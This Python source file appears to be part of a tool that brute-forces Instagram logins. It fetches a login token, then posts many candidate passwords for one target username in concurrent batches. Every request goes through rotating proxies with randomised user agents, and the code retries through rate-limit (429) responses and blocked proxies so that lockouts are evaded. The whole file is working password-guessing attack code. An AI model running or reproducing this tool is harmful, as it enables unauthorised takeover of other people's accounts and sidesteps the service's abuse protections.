from __future__ import absolute_import

import asyncio
import aiohttp

from itertools import islice
import random
from urllib.parse import urlparse

from proxybroker.errors import NoProxyError

from app import settings
from app.lib import exceptions
from app.logging import AppLogger, contextual_log
from app.lib.utils import get_token_from_response, create_url
from app.lib.models import InstagramResult, LoginAttemptContext, LoginContext, TokenContext


def limited_as_completed(coros, limit):

    futures = [
        asyncio.ensure_future(c)
        for c in islice(coros, 0, limit)
    ]

    async def first_to_finish():
        while True:
            await asyncio.sleep(0)
            for f in futures:
                if f.done():
                    futures.remove(f)
                    try:
                        newf = next(coros)
                        futures.append(
                            asyncio.ensure_future(newf))
                    except StopIteration as e:
                        pass
                    return f.result()
    while len(futures) > 0:
        yield first_to_finish()


class request_handler(object):

    def __init__(self, config):
        self.config = config
        self.user_agent = random.choice(settings.USER_AGENTS)

    def _headers(self):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        return headers

    @property
    def connector(self):
        """
        TCPConnector
        -------------
        keepalive_timeout (float) – timeout for connection reusing after
            releasing
        limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        return aiohttp.TCPConnector(
            ssl=False,
            limit=self.config.connection_limit,
            keepalive_timeout=self.config.connector_timeout,
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(total=self.config.fetch_time)


class token_handler(request_handler):

    log = AppLogger('Sending Token Request')

    def _get_token_from_response(self, response):
        token = get_token_from_response(response)
        if not token:
            raise exceptions.TokenNotInResponse()
        return token

    def _notify_request(self, context, retry=1):
        message = 'Sending GET Request'
        if retry != 0:
            message = f'Sending GET Request, Retry {retry + 1}'
        self.log.info(message, extra={'context': context})

    async def fetch(self, session, proxy_pool):
        """
        TODO:
        -----

        Maybe incorporate some sort of max-retry on the attempts so that we dont
        accidentally run into a situation of accumulating a lot of requests.

        For certain exceptions we may want to reintroduce the sleep/timeout,
        but it might be faster to immediately just go to next proxy.
        """
        async def try_with_proxy(attempt=0):
            try:
                proxy = await proxy_pool.get(scheme=urlparse(settings.INSTAGRAM_URL).scheme)
                context = TokenContext(index=attempt, proxy=proxy.__dict__.copy())
                self._notify_request(context, retry=attempt)

                # Raise for status is automatically performed, so we do not have
                # to have a client response handler.
                async with session.get(
                    settings.INSTAGRAM_URL,
                    raise_for_status=True,
                    headers=self._headers(),
                    proxy=create_url(proxy.host, proxy.port),
                ) as response:
                    try:
                        token = self._get_token_from_response(response)
                    except exceptions.TokenNotInResponse as e:
                        self.log.warning(e, extra={'context': context})
                        return await try_with_proxy(attempt=attempt + 1)
                    else:
                        proxy_pool.put(proxy)
                        return token

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientError as e:
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.CancelledError:
                return

            except NoProxyError:
                self.log.error('Waiting on proxies...')
                asyncio.sleep(3)
                return await try_with_proxy(attempt=attempt + 1)

            except (TimeoutError, asyncio.TimeoutError) as e:
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
            # Some error with proxybroker and how it is handling the Queue/ProxyPool.
            except TypeError:
                self.log.error('Having trouble putting proxy in queue.')
                return await try_with_proxy(attempt=attempt + 1)

        return await try_with_proxy()

    async def wait_for_token(self, loop, proxy_pool):

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            task = asyncio.ensure_future(self.fetch(session, proxy_pool))
            token = await task
            if not token:
                raise exceptions.FatalException("Token should be non-null here.")
            return token


class login_handler(request_handler):

    log = AppLogger('Login Request')

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.config.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    def _notify_request(self, context, retry=1):
        message = 'Sending POST Request'
        if retry != 1:
            message = f'Sending POST Request, Retry {retry}'
        self.log.info(message, extra={'context': context})

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    @contextual_log
    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        log = AppLogger('Handling Client Response')

        if response.status >= 400 and response.status < 500:
            log.debug('Response Status Code : %s' % response.status)
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            try:
                log.debug('Creating Result from Response')
                return await self._get_result_from_response(response, context)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response."
                )

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    async def fetch(self, session, proxy_pool, parent_context):
        """
        NOTE
        ----

        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().

        TODO:
        -----

        Maybe incorporate some sort of max-retry on the attempts so that we dont
        accidentally run into a situation of accumulating a lot of requests.

        For certain exceptions we may want to reintroduce the sleep/timeout,
        but it might be faster to immediately just go to next proxy.
        """
        async def try_with_proxy(attempt=0):
            try:
                proxy = await proxy_pool.get(scheme=urlparse(settings.INSTAGRAM_LOGIN_URL).scheme)
                context = LoginAttemptContext(
                    index=attempt,
                    proxy=proxy.__dict__.copy(),
                    parent_index=parent_context.index,
                    password=parent_context.password,
                    token=parent_context.token
                )
                self._notify_request(context, retry=attempt)

                async with session.post(
                    settings.INSTAGRAM_LOGIN_URL,
                    headers=self._headers(context.token),
                    proxy=create_url(proxy.host, proxy.port),
                ) as response:
                    # Only reason to log these errors here is to provide the response
                    # object
                    try:
                        result = await self._handle_client_response(response, context)
                        result = await self._handle_parsed_result(result, context)

                    except exceptions.ResultNotInResponse as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    except exceptions.InstagramResultError as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    else:
                        if not result:
                            raise exceptions.FatalException("Result should not be None here.")
                        proxy_pool.put(proxy)
                        return result

            except RuntimeError as e:
                """
                RuntimeError: File descriptor 87 is used by transport
                <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
                """
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.TimeoutError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientConnectionError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except OSError as e:
                # We have only seen this for the following:
                # >>> OSError: [Errno 24] Too many open files
                # >>> OSError: [Errno 54] Connection reste by peer
                # For the former, we want to sleep for a second, for the latter,
                # we want to move on to a new proxy.
                if e.errno == 54:
                    self.log.error(e, extra={'context': context})
                    return await try_with_proxy(attempt=attempt + 1)
                elif e.errno == 24:
                    asyncio.sleep(3)
                    return await try_with_proxy(attempt=attempt + 1)
                else:
                    raise e

            except NoProxyError:
                self.log.error('Waiting on proxies...')
                asyncio.sleep(3)
                return await try_with_proxy(attempt=attempt + 1)

            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
            # Some error with proxybroker and how it is handling the Queue/ProxyPool.
            except TypeError:
                self.log.error('Having trouble putting proxy in queue.')
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.CancelledError as e:
                pass

            except aiohttp.ClientError as e:
                # For whatever reason these errors don't have any message...
                if e.status == 429:
                    e.message = 'Too many requests.'
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        return await try_with_proxy()

    async def attempt_login(self, session, proxy_pool, token, password, results, index=0):
        """
        TODO
        -----
        Should we incorporate some type of time limit here for waiting to
        get a valid response.
        """

        # Maybe we should just try to notify of attempts beginning for password
        # instead of each individual attempt.
        context = LoginContext(index=index, token=token, password=password)
        result = await self.fetch(session, proxy_pool, context)

        if result and result.conclusive:
            self.log.debug('Got Conclusive Result')
            return result

    async def consume_passwords(self, loop, proxy_pool, results, token):
        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            for res in limited_as_completed(
                (self.attempt_login(session, proxy_pool, token, password, results, index=i)
                for i, password in enumerate(self.config.user.get_new_attempts(
                    limit=self.config.password_limit))), self.config.batch_size):
                result = await res
                await results.put(result)
